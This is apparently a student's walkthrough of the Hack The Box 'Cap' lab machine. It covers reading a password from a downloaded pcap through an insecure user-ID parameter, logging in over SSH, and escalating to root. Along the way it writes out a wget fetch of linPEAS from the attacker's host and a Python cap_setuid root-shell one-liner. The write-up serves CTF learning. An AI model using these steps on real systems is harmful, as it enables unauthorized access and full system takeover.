<h1>Cap – Easy Level Linux based Machine Writeup</h1>

This README file contains my walkthrough of the Cap machine from Hack The Box (Linux, Easy).
This write-up documents my journey, key steps, and the lessons I learned while solving the machine.
I used Kali Linux, as it comes with a wide range of preinstalled tools for penetration testing.<br><br>

<img width="733" height="619" alt="image" src="images/cap 1.png" /><br><br>

Tools Used:<br>
  •	Nmap <br>
  •	Wireshark<br>
  •	LinPeas<br>

I performed a basic nmap scan to search for any open ports. I found out that port 21 (ftp), 22 (ssh) and 80 (http) were open.<br><br>
<img width="919" height="439" alt="image" src="images/cap2.png" /><br><br>

Copy-pasting IP address in firefox led to this page:<br><br>
<img width="939" height="500" alt="image" src="images/cap3.png" /><br><br>

After exploring the dashboard, I came across these options:<br>
•	Security Snapshot (5 Second PCAP + Analysis)<br>
•	IP config <br>
•	Network status<br><br>

I explored every option and found this in Security Snapshot:<br><br>
<img width="939" height="461" alt="image" src="images/cap4.png" /><br><br>

When I change the user id in the address bar, I noticed that the number of data packets also changed. This hinted that I can switch between different users on the system. 
I started with User ID 0, which showed 72 packets – 62 of them were IP and TCP packets. When I clicked the download button, it saved a Wireshark capture file named “0.pcap”.<br><br>

I figured that the file was related to Wireshark, a tool to analyze and capture network traffic. <br><br>
PCAP stands for **Packet Capture**.<br><br>

To get a better understanding of Wireshark, I watched a tutorial from this video:<br>
https://youtu.be/qTaOZrDnMzQ?si=TxdIpK_-dVGmajMT<br><br>

After that, I started examining the packets closely. I opened the file in Wireshark and used:<br>
Right-click -> follow -> TCP Stream<br>
Here, I got Nathan’s Password.<br><br>

Since ssh is also open, I tried entering through ssh using:<br>
ssh nathan@10.10.10.245<br>
And… BOOM! I’m IN!!<br><br>

Inside Nathan’s home directory, I found user.txt file, which contained the user flag:<br>
69033e…………..cd75b<br><br>

After exploring the remaining directories and files, nothing else of value turned up. This meant one thing:<br>
**Privilege Escalation Time!**<br><br>

To escalate privileges, I decided to run linPEAS, a powerful enumeration script that helps identify privilege escalation paths on Linux systems.<br>
I set up a listener on my machine:<br>
	python3 -m http.server 80<br><br>
  
And download linPeas on the target machine (as Nathan):<br>
wget http://10.10.14.97/linpeas.sh<br><br>

made it executable by:<br>
	chmod +x linpeas.sh<br><br>
  
and execute it:<br>
 	./linpeas.sh<br><br>
  
It gave me a plenty of information. One of them was file capabilities:<br>
	/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip<br><br>

Might be useful.<br><br>

Searched up gtfobins python and got this in file capabilities:<br>
	./python -c 'import os; os.setuid(0); os.system("/bin/sh")'<br><br>
  
So, adjusting it for the target machine’s Python binary, the final payload becomes:<br>
	/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'<br><br>
  
I executed it in the victim’s machine. BOOM!! I am the root user.<br><br>

<img width="940" height="318" alt="image" src="images/cap5.png" /><br><br>

So, that was CAP!
